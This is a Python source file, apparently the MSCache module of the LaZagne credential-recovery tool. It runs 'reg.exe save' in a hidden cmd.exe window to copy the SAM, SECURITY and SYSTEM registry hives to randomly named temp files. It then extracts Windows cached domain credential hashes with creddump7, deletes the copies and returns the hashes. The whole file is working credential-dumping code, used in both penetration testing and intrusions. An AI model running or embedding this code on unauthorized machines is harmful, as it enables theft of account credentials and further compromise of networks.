from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.WinStructure import *
from lazagne.config.constant import *
from creddump7.win32.domcachedump import dump_file_hashes
import subprocess
import _subprocess as sub
import tempfile
import random
import string
import os

class Cachedump(ModuleInfo):
	def __init__(self):
		options = {'command': '--mscache', 'action': 'store_true', 'dest': 'cachedump', 'help': 'retrieve Windows hashes'}
		ModuleInfo.__init__(self, 'hashes', 'windows', options, need_system_privileges=True)

		self.FILTER=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])
		
		if not constant.hives:
			tmp = tempfile.gettempdir()
			constant.hives = {
				'sam' 		:  	os.path.join(tmp, ''.join([random.choice(string.ascii_lowercase) for x in range(0, random.randint(6, 12))])),
				'security'	: 	os.path.join(tmp, ''.join([random.choice(string.ascii_lowercase) for x in range(0, random.randint(6, 12))])),
				'system'	: 	os.path.join(tmp, ''.join([random.choice(string.ascii_lowercase) for x in range(0, random.randint(6, 12))]))
			}
	
	def save_hives(self):
		for h in constant.hives:
			if not os.path.exists(constant.hives[h]):
				try:
					cmd = 'reg.exe save hklm\%s %s' % (h, constant.hives[h])
					self.run_cmd(cmd)
				except Exception,e:
					return False
		return True

	# try to remove all temporary files
	def delete_existing_system_hives(self):
		for h in constant.hives:
			try:
				os.remove(constant.hives[h])
			except:
				pass

	def run_cmd(self, cmdline):
		command=['cmd.exe', '/c', cmdline]
		info = subprocess.STARTUPINFO()
		info.dwFlags = sub.STARTF_USESHOWWINDOW
		info.wShowWindow = sub.SW_HIDE
		p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
		results, _ = p.communicate()

	def run(self, software_name=None):
		# save system hives
		if not self.save_hives():
			print_debug('ERROR', 'Failed to save system hives')
			return 

		isVistaOrHigher = True
		if float(get_os_version()) >= 6.0:
			isVistaOrHigher = True
		else:
			isVistaOrHigher = False
		
		password = dump_file_hashes(constant.hives['system'], constant.hives['security'], isVistaOrHigher)

		# remove hives files
		self.delete_existing_system_hives()

		pwdFound = ['__MSCache__', password]
		return pwdFound
